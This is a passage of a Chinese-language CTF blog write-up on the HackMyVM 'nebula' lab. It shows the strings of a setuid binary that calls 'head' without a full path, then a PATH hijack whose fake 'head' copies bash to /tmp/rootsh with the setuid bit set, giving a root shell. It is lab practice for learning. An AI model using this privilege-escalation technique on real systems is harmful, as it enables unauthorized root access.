/home/laboratoryadmin/autoScripts/PMCEmployees</span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">libc.so.6</span><br><span class="line">setuid</span><br><span class="line">printf</span><br><span class="line">system</span><br><span class="line">__cxa_finalize</span><br><span class="line">__libc_start_main</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">u+UH</span><br><span class="line">[]A\A]A^A_</span><br><span class="line">Showing top 10 best employees of PMC company</span><br><span class="line">head /home/pmccentral/documents/employees.txt</span><br><span class="line">:*3$&quot;</span><br><span class="line">GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0</span><br><span class="line">crtstuff.c</span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed.8061</span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">PMCEmployees.c</span><br><span class="line">__FRAME_END__</span><br><span class="line">__init_array_end</span><br><span class="line">_DYNAMIC</span><br><span class="line">__init_array_start</span><br><span class="line">__GNU_EH_FRAME_HDR</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">_edata</span><br><span class="line">system@@GLIBC_2.2.5</span><br><span class="line">printf@@GLIBC_2.2.5</span><br><span class="line">__libc_start_main@@GLIBC_2.2.5</span><br><span class="line">__data_start</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">__libc_csu_init</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">setuid@@GLIBC_2.2.5</span><br><span class="line">__cxa_finalize@@GLIBC_2.2.5</span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.gnu.property</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.note.ABI-tag</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rela.dyn</span><br><span class="line">.rela.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.plt.sec</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.dynamic</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>head /home/pmccentral/documents/employees.txt</code>我们在字符串中发现了这个命令，我们发现head命令并没有指定全路径，所以我们直接劫持head命令即可</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">laboratoryadmin@laboratoryuser:/tmp$ cat head </span><br><span class="line">cp /bin/bash /tmp/rootsh; chmod +xs /tmp/rootsh</span><br><span class="line">laboratoryadmin@laboratoryuser:/tmp$ echo $PATH</span><br><span class="line">/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</span><br><span class="line">laboratoryadmin@laboratoryuser:/tmp$ ./rootsh -p</span><br><span class="line">rootsh-5.0# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p><strong>拿下，这个靶机不难</strong></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">hack-my-vm:nebula</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">端口探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">80端口渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/20/hack-my-vm-nebula/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/20/hack-my-vm-nebula/&text=hack-my-vm:nebula"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/20/hack-my-vm-nebula/&title=hack-my-vm:nebula"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/20/hack-my-vm-nebula/&is_video=false&description=hack-my-vm:nebula"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hack-my-vm:nebula&body=Check out this article: http://example.com/2025/01/20/hack-my-vm-nebula/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/20/hack-my-vm-nebula/&title=hack-my-vm:nebula"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/20/hack-my-vm-nebula/&title=hack-my-vm:nebula"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/20/hack-my-vm-nebula/&title=hack-my-vm:nebula"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/20/hack-my-vm-nebula/&title=hack-my-vm:nebula"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/20/hack-my-vm-nebula/&name=hack-my-vm:nebula&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/20/hack-my-vm-nebula/&t=hack-my-vm:nebula"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
